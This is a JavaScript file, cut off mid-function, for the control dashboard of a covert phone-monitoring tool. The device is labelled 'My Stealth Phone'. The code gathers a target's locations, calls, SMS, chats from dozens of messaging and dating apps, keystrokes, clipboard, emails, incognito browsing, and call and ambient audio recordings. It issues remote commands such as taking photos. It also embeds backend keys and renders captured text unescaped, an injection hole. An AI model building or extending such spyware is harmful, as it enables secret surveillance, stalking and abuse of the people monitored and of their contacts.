// Supabase Credentials
const SUPABASE_URL = "https://orrdsscvzaginlvmbyow.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9ycmRzc2N2emFnaW5sdm1ieW93Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE4NDAyNDgsImV4cCI6MjA5NzQxNjI0OH0.DAxBhVIbTewGs_GiR8cmKpo-zT1eOHwG6W7HVeQzZVU";

// Cloudinary Credentials (for media storage)
const CLOUDINARY_CLOUD_NAME = "dzd8hoo8e";

// Initialize Supabase Client
const sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Mock Data for Demo (if no data in Supabase)
let allData = {
    devices: [{ id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", device_name: "My Stealth Phone" }],
    locations: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", latitude: 23.8103, longitude: 90.4125, battery_level: 75, is_charging: true, recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", latitude: 23.811, longitude: 90.413, battery_level: 74, is_charging: true, recorded_at: new Date(Date.now() - 300000).toISOString() }
    ],
    call_logs: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_name: "Mom", phone_number: "+8801712345678", call_type: "incoming", duration: 120, recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_name: "Boss", phone_number: "+8801812345678", call_type: "outgoing", duration: 300, recorded_at: new Date(Date.now() - 3600000).toISOString() },
        { id: "3", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_name: null, phone_number: "+8801912345678", call_type: "missed", duration: 0, recorded_at: new Date(Date.now() - 7200000).toISOString() }
    ],
    sms: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_name: "Mom", phone_number: "+8801712345678", message_type: "received", content: "Are you coming home for dinner?", recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_name: "Mom", phone_number: "+8801712345678", message_type: "sent", content: "Yes, I'll be there in 30 minutes!", recorded_at: new Date(Date.now() - 60000).toISOString() }
    ],
    messenger_messages: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", messenger_type: "whatsapp", contact_name: "John", message_type: "received", content: "Hey! Did you see the news?", recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", messenger_type: "telegram", contact_name: "Work Group", message_type: "received", content: "Meeting at 3 PM tomorrow", recorded_at: new Date(Date.now() - 3600000).toISOString() }
    ],
    web_history: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", url: "https://google.com", title: "Google", entry_time: new Date(Date.now() - 3600000).toISOString(), exit_time: new Date(Date.now() - 3000000).toISOString(), duration_seconds: 600, browsing_mode: "standard", recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", url: "https://github.com", title: "GitHub", entry_time: new Date(Date.now() - 3000000).toISOString(), exit_time: new Date(Date.now() - 1800000).toISOString(), duration_seconds: 1200, browsing_mode: "incognito", recorded_at: new Date(Date.now() - 1800000).toISOString() },
        { id: "3", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", url: "https://stackoverflow.com", title: "Stack Overflow", entry_time: new Date(Date.now() - 1800000).toISOString(), exit_time: new Date(Date.now() - 600000).toISOString(), duration_seconds: 1200, browsing_mode: "standard", recorded_at: new Date(Date.now() - 600000).toISOString() }
    ],
    app_usage: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", package_name: "com.whatsapp", app_name: "WhatsApp", usage_time: 3600, recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", package_name: "com.instagram.android", app_name: "Instagram", usage_time: 2400, recorded_at: new Date().toISOString() },
        { id: "3", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", package_name: "com.google.android.youtube", app_name: "YouTube", usage_time: 5400, recorded_at: new Date().toISOString() }
    ],
    photos: [],
    screenshots: [],
    keystrokes: [],
    clipboard: [],
    contacts: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_id: "1", display_name: "Mom", phone_numbers: ["+8801712345678"], emails: ["mom@example.com"], recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", contact_id: "2", display_name: "John Doe", phone_numbers: ["+1234567890", "+0987654321"], emails: ["john@example.com"], recorded_at: new Date(Date.now() - 86400000).toISOString() }
    ],
    device_info: [],
    network_info: [],
    sim_changes: [],
    remote_commands: [],
    geofences: [],
    ambient_recordings: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", file_url: "https://example.com/ambient1.mp3", duration_seconds: 300, recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", file_url: "https://example.com/ambient2.mp3", duration_seconds: 600, recorded_at: new Date(Date.now() - 3600000).toISOString() }
    ],
    screen_recordings: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", file_url: "https://example.com/screen1.mp4", duration_seconds: 1200, recorded_at: new Date().toISOString() }
    ],
    risk_alerts: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", alert_type: "sensitive_word", description: "Sensitive word detected", source: "whatsapp", content: "Hey, let's meet at the secret location!", recorded_at: new Date().toISOString() },
        { id: "2", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", alert_type: "harmful_content", description: "Potentially harmful content", source: "browser", content: "https://harmful-site.example.com", recorded_at: new Date(Date.now() - 7200000).toISOString() }
    ],
    call_recordings: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", file_url: "https://example.com/call1.mp3", contact_name: "Mom", phone_number: "+8801712345678", call_type: "incoming", duration_seconds: 120, recorded_at: new Date().toISOString() }
    ],
    email_entries: [
        { id: "1", device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f", from_address: "john@example.com", to_addresses: ["me@example.com"], subject: "Meeting Tomorrow", body: "Hey, let's meet tomorrow at 3 PM!", recorded_at: new Date(Date.now() - 86400000).toISOString() }
    ]
};

let map, appsChart;
let geofenceCircles = [];
let geofences = [];
let currentPage = 'dashboard';
let searchQuery = '';
let startDate = null;
let endDate = null;
let selectedPlatform = 'all'; // New: selected platform filter
let alerts = [];

// Helper to get platform icon/name
const platformNames = {
    whatsapp: "WhatsApp",
    whatsapp_business: "WhatsApp Business",
    telegram: "Telegram",
    telegram_x: "Telegram X",
    messenger: "Messenger",
    messenger_lite: "Messenger Lite",
    wechat: "WeChat",
    signal: "Signal",
    viber: "Viber",
    line: "LINE",
    imo: "IMO",
    snapchat: "Snapchat",
    discord: "Discord",
    steam_chat: "Steam Chat",
    slack: "Slack",
    microsoft_teams: "Microsoft Teams",
    google_chat: "Google Chat",
    threema: "Threema",
    wickr: "Wickr",
    session: "Session",
    wire: "Wire",
    kakaotalk: "KakaoTalk",
    zalo: "Zalo",
    bip: "BIP",
    botim: "Botim",
    skype: "Skype",
    tinder: "Tinder",
    bumble: "Bumble",
    tagged: "Tagged",
    meetme: "MeetMe",
    groupme: "GroupMe",
    band: "BAND",
    kik: "Kik",
    google_meet: "Google Meet",
    icq: "ICQ",
    hike_messenger: "Hike",
    tango: "Tango",
    google_messages: "Google Messages",
    instagram: "Instagram",
    facebook: "Facebook",
    tiktok: "TikTok",
    vsco: "VSCO",
    sms: "SMS"
};

function requestNotificationPermission() {
    if ('Notification' in window) {
        Notification.requestPermission().then(permission => {
            console.log('Notification permission:', permission);
        });
    }
}

function sendNotification(msg) {
    if ('Notification' in window && Notification.permission === 'granted') {
        const platformName = platformNames[msg.messenger_type] || msg.messenger_type || 'Unknown';
        const senderName = msg.contact_name || msg.phone_number || 'Unknown Sender';
        const notification = new Notification(platformName, {
            body: `${senderName}: ${msg.content || 'New message'}`,
            icon: 'https://trae.ai/favicon.ico'
        });
        notification.onclick = () => {
            window.focus();
        };
    }
}

document.addEventListener("DOMContentLoaded", () => {
    requestNotificationPermission();
    initNavigation();
    initMap();
    initCharts();
    initEventListeners();
    updateDashboard();
    initSupabaseRealtime();
});

function initNavigation() {
    const navItems = document.querySelectorAll(".nav-item");
    const pages = document.querySelectorAll(".page");
    const pageTitle = document.getElementById("page-title");

    navItems.forEach(item => {
        item.addEventListener("click", () => {
            navItems.forEach(nav => nav.classList.remove("active"));
            pages.forEach(page => page.classList.remove("active"));

            item.classList.add("active");
            const pageId = item.dataset.page + "-page";
            document.getElementById(pageId).classList.add("active");
            pageTitle.textContent = item.textContent;
            currentPage = item.dataset.page;

            if (item.dataset.page === "map") {
                setTimeout(() => map.invalidateSize(), 100);
            }

            updateCurrentPage();
        });
    });
}

function initEventListeners() {
    // Populate platform filter dropdown
    const platformFilter = document.getElementById("platform-filter");
    Object.entries(platformNames).forEach(([key, name]) => {
        const option = document.createElement("option");
        option.value = key;
        option.textContent = name;
        platformFilter.appendChild(option);
    });

    document.getElementById("refresh-btn").addEventListener("click", updateDashboard);
    document.getElementById("export-csv-btn").addEventListener("click", exportToCSV);
    document.getElementById("export-json-btn").addEventListener("click", exportToJSON);
    document.getElementById("search-input").addEventListener("input", (e) => {
        searchQuery = e.target.value.toLowerCase();
        updateCurrentPage();
    });
    document.getElementById("platform-filter").addEventListener("change", (e) => {
        selectedPlatform = e.target.value;
        updateCurrentPage();
    });
    document.getElementById("start-date").addEventListener("change", (e) => {
        startDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });
    document.getElementById("end-date").addEventListener("change", (e) => {
        endDate = e.target.value ? new Date(e.target.value) : null;
        updateCurrentPage();
    });

    document.getElementById("cmd-fetch-location").addEventListener("click", () => sendRemoteCommand("fetch_location"));
    document.getElementById("cmd-take-photo").addEventListener("click", () => sendRemoteCommand("take_photo"));
    document.getElementById("cmd-ring-device").addEventListener("click", () => sendRemoteCommand("ring_device"));
    document.getElementById("cmd-sync-data").addEventListener("click", () => sendRemoteCommand("sync_data"));

    document.getElementById("btn-add-geofence").addEventListener("click", addGeofence);
}

function initMap() {
    map = L.map("map").setView([23.8103, 90.4125], 13);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "&copy; OpenStreetMap contributors"
    }).addTo(map);
}

function initCharts() {
    const appsCtx = document.getElementById("apps-chart").getContext("2d");
    appsChart = new Chart(appsCtx, {
        type: "doughnut",
        data: {
            labels: [],
            datasets: [{
                data: [],
                backgroundColor: ["#3b82f6", "#10b981", "#f59e0b", "#ef4444", "#8b5cf6", "#ec4899"]
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { position: "bottom" }
            }
        }
    });
}

function initSupabaseRealtime() {
    // Listen to new locations
    const locationChannel = sbClient
        .channel('public:locations')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'locations' }, (payload) => {
            allData.locations.unshift(payload.new);
            checkAlerts(payload.new);
            if (currentPage === 'map' || currentPage === 'dashboard') {
                updateCurrentPage();
            }
        })
        .subscribe();

    // Listen to remote commands responses
    const commandsChannel = sbClient
        .channel('public:remote_commands')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'remote_commands' }, (payload) => {
            if (payload.eventType === 'INSERT') {
                allData.remote_commands.unshift(payload.new);
            }
        })
        .subscribe();

    // Listen to new messenger messages (for real-time notifications)
    const messagesChannel = sbClient
        .channel('public:messenger_messages')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messenger_messages' }, (payload) => {
            allData.messenger_messages.unshift(payload.new);
            if (currentPage === 'messengers') {
                updateCurrentPage();
            }
            sendNotification(payload.new);
        })
        .subscribe();

    // Listen to new SMS
    const smsChannel = sbClient
        .channel('public:sms')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'sms' }, (payload) => {
            allData.sms.unshift(payload.new);
            if (currentPage === 'sms') {
                updateCurrentPage();
            }
            sendNotification({ ...payload.new, messenger_type: 'sms' });
        })
        .subscribe();
}

async function fetchData() {
    const tables = ["devices", "locations", "call_logs", "sms", "messenger_messages", "web_history", "app_usage", "photos", "screenshots", "keystrokes", "clipboard", "contacts", "device_info", "network_info", "sim_changes", "geofences", "ambient_recordings", "screen_recordings", "risk_alerts", "call_recordings", "email_entries"];
    for (const table of tables) {
        try {
            const { data, error } = await sbClient.from(table).select("*").order("recorded_at", { ascending: false });
            if (!error && data && data.length > 0) {
                allData[table] = data;
            }
        } catch (e) {
            console.log(`Error fetching ${table}:`, e);
        }
    }
}

function filterDataByDate(data) {
    return data.filter(item => {
        const itemDate = new Date(item.recorded_at);
        if (startDate && itemDate < startDate) return false;
        if (endDate && itemDate > endDate) return false;
        return true;
    });
}

function searchData(data, fields) {
    if (!searchQuery) return data;
    return data.filter(item => {
        return fields.some(field => {
            const value = item[field];
            return value && value.toString().toLowerCase().includes(searchQuery);
        });
    });
}

function formatDuration(seconds) {
    if (seconds === 0) return "-";
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}m ${secs}s`;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function addAlert(message, type = 'info') {
    const alert = { id: Date.now(), message, type };
    alerts.push(alert);
    renderAlerts();
    setTimeout(() => {
        removeAlert(alert.id);
    }, 10000);
}

function removeAlert(id) {
    alerts = alerts.filter(a => a.id !== id);
    renderAlerts();
}

function renderAlerts() {
    const container = document.getElementById('alerts-container');
    container.innerHTML = alerts.map(alert => `
        <div class="alert ${alert.type}">
            <span>${alert.message}</span>
            <button style="margin-left: auto; background: none; border: none; cursor: pointer; font-weight: bold;" onclick="removeAlert(${alert.id})">×</button>
        </div>
    `).join('');
}

function checkAlerts(location) {
    // Battery low alert
    if (location.battery_level < 20) {
        addAlert(`⚠️ Low battery: ${location.battery_level}%`, 'warning');
    }

    // Geofence alerts
    geofences.forEach(geofence => {
        const distance = calculateDistance(
            location.latitude, location.longitude,
            geofence.latitude, geofence.longitude
        );
        if (distance <= geofence.radius) {
            addAlert(`📍 Device entered geofence: ${geofence.name}`, 'info');
        }
    });
}

function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371000; // Radius of Earth in meters
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
              Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

async function sendRemoteCommand(command) {
    try {
        const { error } = await sbClient.from('remote_commands').insert({
            device_id: "ef7dde6f-4296-4c65-a20b-a36df9f07c8f",
            command: command,
            status: 'pending',
            created_at: new Date().toISOString()
        });
        if (!error) {
            addAlert(`✅ Command "${command}" sent successfully`, 'info');
        }
    } catch (e) {
        console.error('Error sending command:', e);
    }
}

function addGeofence() {
    const nameInput = document.getElementById('geofence-name');
    const radiusInput = document.getElementById('geofence-radius');
    const name = nameInput.value.trim();
    const radius = parseFloat(radiusInput.value);

    if (!name || isNaN(radius)) {
        addAlert('Please enter a valid name and radius', 'warning');
        return;
    }

    const center = map.getCenter();
    const geofence = {
        id: Date.now(),
        name,
        latitude: center.lat,
        longitude: center.lng,
        radius: radius
    };

    geofences.push(geofence);
    renderGeofences();
    renderGeofenceOnMap(geofence);

    nameInput.value = '';
    radiusInput.value = '100';
}

function deleteGeofence(id) {
    geofences = geofences.filter(g => g.id !== id);
    renderGeofences();
    updateMap();
}

function renderGeofences() {
    const container = document.getElementById('geofences-list');
    container.innerHTML = geofences.map(g => `
        <div class="geofence-item">
            <span>${g.name} (${g.radius}m)</span>
            <button class="delete-btn" onclick="deleteGeofence(${g.id})">Delete</button>
        </div>
    `).join('');
}

function renderGeofenceOnMap(geofence) {
    const circle = L.circle([geofence.latitude, geofence.longitude], {
        color: '#ef4444',
        fillColor: '#ef4444',
        fillOpacity: 0.2,
        radius: geofence.radius
    }).addTo(map);
    circle.bindPopup(`Geofence: ${geofence.name}`);
    geofenceCircles.push(circle);
}

async function updateDashboard() {
    await fetchData();
    updateCurrentPage();
}

function updateCurrentPage() {
    switch (currentPage) {
        case 'dashboard':
            updateStats();
            updateCharts();
            break;
        case 'map':
            updateMap();
            renderGeofences();
            break;
        case 'calls':
            updateCallsTable();
            break;
        case 'sms':
            updateSmsTable();
            break;
        case 'messengers':
            updateMessengersTable();
            break;
        case 'web':
            updateWebTable();
            break;
        case 'apps':
            updateAppsTable();
            break;
        case 'photos':
            updatePhotosGrid();
            break;
        case 'screenshots':
            updateScreenshotsGrid();
            break;
        case 'keystrokes':
            updateKeystrokesTable();
            break;
        case 'clipboard':
            updateClipboardTable();
            break;
        case 'contacts':
            updateContactsTable();
            break;
        case 'call-recordings':
            updateCallRecordingsTable();
            break;
        case 'emails':
            updateEmailsTable();
            break;
        case 'ambient':
            updateAmbientTable();
            break;
        case 'screen-record':
            updateScreenRecordTable();
            break;
        case 'risks':
            updateRisksTable();
            break;
        case 'device':
            updateDeviceInfo();
            break;
        case 'network':
            updateNetworkTable();
            break;
        case 'sim':
            updateSimTable();
            break;
    }
}

function updateStats() {
    const locations = filterDataByDate(allData.locations);
    const calls = filterDataByDate(allData.call_logs);
    const sms = filterDataByDate(allData.sms);

    document.getElementById("stat-locations").textContent = locations.length;
    document.getElementById("stat-calls").textContent = calls.length;
    document.getElementById("stat-sms").textContent = sms.length;

    const latestLocation = locations[0];
    document.getElementById("stat-battery").textContent = latestLocation ? `${latestLocation.battery_level}%` : "-";
}

function updateMap() {
    // Clear existing markers and circles
    map.eachLayer(layer => {
        if (layer instanceof L.Marker || layer instanceof L.Circle) {
            map.removeLayer(layer);
        }
    });
    geofenceCircles = [];

    const locations = filterDataByDate(allData.locations);
    locations.slice(0, 10).forEach(loc => {
        const marker = L.marker([loc.latitude, loc.longitude])
            .addTo(map)
            .bindPopup(`
                <div style="padding:8px">
                    <strong>📍 Location</strong><br>
                    Battery: ${loc.battery_level}%<br>
                    Charging: ${loc.is_charging ? "Yes" : "No"}<br>
                    Time: ${new Date(loc.recorded_at).toLocaleString()}
                </div>
            `);
    });

    // Re-add geofences
    geofences.forEach(renderGeofenceOnMap);

    if (locations.length > 0) {
        const latest = locations[0];
        map.setView([latest.latitude, latest.longitude], 15);
    }
}

function updateCallsTable() {
    let calls = filterDataByDate(allData.call_logs);
    calls = searchData(calls, ['contact_name', 'phone_number']);

    const tbody = document.getElementById("calls-table");
    tbody.innerHTML = calls.map(call => `
        <tr>
            <td>${call.contact_name || "Unknown"}</td>
            <td>${call.phone_number}</td>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${call.call_type === "incoming" ? "#dcfce7" : call.call_type === "outgoing" ? "#dbeafe" : "#fee2e2"}; color:${call.call_type === "incoming" ? "#166534" : call.call_type === "outgoing" ? "#1d4ed8" : "#991b1b"}">${call.call_type}</span></td>
            <td>${formatDuration(call.duration)}</td>
            <td>${new Date(call.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateSmsTable() {
    let sms = filterDataByDate(allData.sms);
    sms = searchData(sms, ['contact_name', 'phone_number', 'content']);

    const tbody = document.getElementById("sms-table");
    tbody.innerHTML = sms.map(msg => `
        <tr>
            <td>${msg.contact_name || "Unknown"}</td>
            <td>${msg.phone_number}</td>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${msg.message_type === "sent" ? "#dbeafe" : "#dcfce7"}; color:${msg.message_type === "sent" ? "#1d4ed8" : "#166534"}">${msg.message_type}</span></td>
            <td style="max-width:300px; overflow:hidden; text-overflow:ellipsis;">${msg.content}</td>
            <td>${new Date(msg.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function formatMessengerType(type) {
    const nameMap = {
        'whatsapp': 'WhatsApp',
        'whatsapp_business': 'WhatsApp Business',
        'telegram': 'Telegram',
        'telegram_x': 'Telegram X',
        'messenger': 'Messenger',
        'messenger_lite': 'Messenger Lite',
        'wechat': 'WeChat',
        'signal': 'Signal',
        'viber': 'Viber',
        'line': 'Line',
        'imo': 'IMO',
        'snapchat': 'Snapchat',
        'discord': 'Discord',
        'steam_chat': 'Steam Chat',
        'slack': 'Slack',
        'microsoft_teams': 'Microsoft Teams',
        'google_chat': 'Google Chat',
        'threema': 'Threema',
        'wickr': 'Wickr',
        'session': 'Session',
        'wire': 'Wire',
        'kakaotalk': 'KakaoTalk',
        'zalo': 'Zalo',
        'bip': 'BiP',
        'botim': 'Botim',
        'skype': 'Skype',
        'tinder': 'Tinder',
        'bumble': 'Bumble',
        'tagged': 'Tagged',
        'meetme': 'MeetMe',
        'groupme': 'GroupMe',
        'band': 'BAND',
        'kik': 'Kik',
        'google_meet': 'Google Meet',
        'icq': 'ICQ',
        'hike_messenger': 'Hike Messenger',
        'tango': 'Tango',
        'google_messages': 'Google Messages',
        'instagram': 'Instagram'
    };
    return nameMap[type] || type.charAt(0).toUpperCase() + type.slice(1);
}

function updateMessengersTable() {
    let messages = filterDataByDate(allData.messenger_messages);
    // Add platform filter
    if (selectedPlatform !== 'all') {
        messages = messages.filter(msg => msg.messenger_type === selectedPlatform);
    }
    messages = searchData(messages, ['messenger_type', 'contact_name', 'content']);

    const tbody = document.getElementById("messengers-table");
    if (messages.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px; color:#64748b;">No messages found</td></tr>';
        return;
    }
    tbody.innerHTML = messages.map(msg => `
        <tr>
            <td><span style="font-weight:600;">${formatMessengerType(msg.messenger_type)}</span></td>
            <td>${msg.contact_name || "Unknown"}</td>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${msg.message_type === "sent" ? "#dbeafe" : "#dcfce7"}; color:${msg.message_type === "sent" ? "#1d4ed8" : "#166534"}">${msg.message_type}</span></td>
            <td style="max-width:300px; overflow:hidden; text-overflow:ellipsis;">${msg.content}</td>
            <td>${new Date(msg.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateWebTable() {
    let web = filterDataByDate(allData.web_history);
    web = searchData(web, ['title', 'url']);

    const tbody = document.getElementById("web-table");
    tbody.innerHTML = web.map(item => `
        <tr>
            <td>${item.title || item.url}</td>
            <td><a href="${item.url}" target="_blank" style="color:#3b82f6;">${item.url}</a></td>
            <td>${item.entry_time ? new Date(item.entry_time).toLocaleString() : '-'}</td>
            <td>${item.exit_time ? new Date(item.exit_time).toLocaleString() : '-'}</td>
            <td>${item.duration_seconds ? formatDuration(item.duration_seconds) : '-'}</td>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${item.browsing_mode === 'incognito' ? '#fee2e2' : '#dbeafe'}; color:${item.browsing_mode === 'incognito' ? '#ef4444' : '#3b82f6'};">${item.browsing_mode}</span></td>
            <td>${new Date(item.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateAppsTable() {
    let apps = filterDataByDate(allData.app_usage);
    apps = searchData(apps, ['package_name', 'app_name']);

    const tbody = document.getElementById("apps-table");
    tbody.innerHTML = apps.map(app => `
        <tr>
            <td>${app.app_name || app.package_name}</td>
            <td><code style="background:#f1f5f9; padding:2px 6px; border-radius:4px;">${app.package_name}</code></td>
            <td>${formatDuration(app.usage_time)}</td>
            <td>${new Date(app.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updatePhotosGrid() {
    let photos = filterDataByDate(allData.photos);
    const grid = document.getElementById("photos-grid");
    if (photos.length === 0) {
        grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:40px; color:#64748b;">No photos yet</div>';
        return;
    }
    grid.innerHTML = photos.map(photo => `
        <div class="grid-item">
            <img src="${photo.photo_url || "https://via.placeholder.com/200x160?text=Photo"}" alt="Photo">
            <div class="info">${new Date(photo.recorded_at).toLocaleString()}</div>
        </div>
    `).join('');
}

function updateScreenshotsGrid() {
    let screenshots = filterDataByDate(allData.screenshots);
    const grid = document.getElementById("screenshots-grid");
    if (screenshots.length === 0) {
        grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:40px; color:#64748b;">No screenshots yet</div>';
        return;
    }
    grid.innerHTML = screenshots.map(ss => `
        <div class="grid-item">
            <img src="${ss.screenshot_url || "https://via.placeholder.com/200x160?text=Screenshot"}" alt="Screenshot">
            <div class="info">${new Date(ss.recorded_at).toLocaleString()}</div>
        </div>
    `).join('');
}

function updateKeystrokesTable() {
    let keystrokes = filterDataByDate(allData.keystrokes);
    keystrokes = searchData(keystrokes, ['app_name', 'text_content']);

    const tbody = document.getElementById("keystrokes-table");
    if (keystrokes.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:40px; color:#64748b;">No keystrokes yet</td></tr>';
        return;
    }
    tbody.innerHTML = keystrokes.map(key => `
        <tr>
            <td>${key.app_name || "-"}</td>
            <td style="max-width:400px; overflow:hidden; text-overflow:ellipsis;">${key.text_content}</td>
            <td>${new Date(key.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateClipboardTable() {
    let clipboard = filterDataByDate(allData.clipboard);
    clipboard = searchData(clipboard, ['content']);

    const tbody = document.getElementById("clipboard-table");
    if (clipboard.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" style="text-align:center; padding:40px; color:#64748b;">No clipboard data yet</td></tr>';
        return;
    }
    tbody.innerHTML = clipboard.map(item => `
        <tr>
            <td style="max-width:600px; overflow:hidden; text-overflow:ellipsis;">${item.content}</td>
            <td>${new Date(item.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateContactsTable() {
    let contacts = filterDataByDate(allData.contacts);
    contacts = searchData(contacts, ['display_name', 'phone_numbers', 'emails']);

    const tbody = document.getElementById("contacts-table");
    if (contacts.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:40px; color:#64748b;">No contacts yet</td></tr>';
        return;
    }
    tbody.innerHTML = contacts.map(contact => `
        <tr>
            <td>${contact.display_name || "Unknown"}</td>
            <td>${contact.phone_numbers ? contact.phone_numbers.join(", ") : "-"}</td>
            <td>${contact.emails ? contact.emails.join(", ") : "-"}</td>
            <td>${new Date(contact.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateCallRecordingsTable() {
    let recordings = filterDataByDate(allData.call_recordings);
    recordings = searchData(recordings, ['contact_name', 'phone_number']);

    const tbody = document.getElementById("call-recordings-table");
    if (recordings.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px; color:#64748b;">No call recordings yet</td></tr>';
        return;
    }
    tbody.innerHTML = recordings.map(rec => `
        <tr>
            <td>${rec.contact_name || "Unknown"}</td>
            <td>${rec.phone_number || "-"}</td>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${rec.call_type === "incoming" ? "#dcfce7" : "#dbeafe"}; color:${rec.call_type === "incoming" ? "#166534" : "#1d4ed8"};">${rec.call_type}</span></td>
            <td>${rec.duration_seconds ? formatDuration(rec.duration_seconds) : "-"}</td>
            <td><a href="${rec.file_url}" target="_blank" style="color:#3b82f6;">${rec.file_url ? rec.file_url.split("/").pop() : "-"}</a></td>
            <td>${new Date(rec.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateEmailsTable() {
    let emails = filterDataByDate(allData.email_entries);
    emails = searchData(emails, ['from_address', 'subject', 'body']);

    const tbody = document.getElementById("emails-table");
    if (emails.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px; color:#64748b;">No emails yet</td></tr>';
        return;
    }
    tbody.innerHTML = emails.map(email => `
        <tr>
            <td>${email.from_address || "Unknown"}</td>
            <td>${email.to_addresses ? email.to_addresses.join(", ") : "-"}</td>
            <td style="max-width:300px; overflow:hidden; text-overflow:ellipsis;">${email.subject || "-"}</td>
            <td style="max-width:400px; overflow:hidden; text-overflow:ellipsis;">${email.body || "-"}</td>
            <td>${new Date(email.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateAmbientTable() {
    let ambient = filterDataByDate(allData.ambient_recordings);
    ambient = searchData(ambient, ['file_url']);

    const tbody = document.getElementById("ambient-table");
    if (ambient.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:40px; color:#64748b;">No ambient recordings yet</td></tr>';
        return;
    }
    tbody.innerHTML = ambient.map(rec => `
        <tr>
            <td><a href="${rec.file_url}" target="_blank" style="color:#3b82f6;">${rec.file_url.split('/').pop()}</a></td>
            <td>${formatDuration(rec.duration_seconds)}</td>
            <td>${new Date(rec.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateScreenRecordTable() {
    let screenRec = filterDataByDate(allData.screen_recordings);
    screenRec = searchData(screenRec, ['file_url']);

    const tbody = document.getElementById("screen-record-table");
    if (screenRec.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:40px; color:#64748b;">No screen recordings yet</td></tr>';
        return;
    }
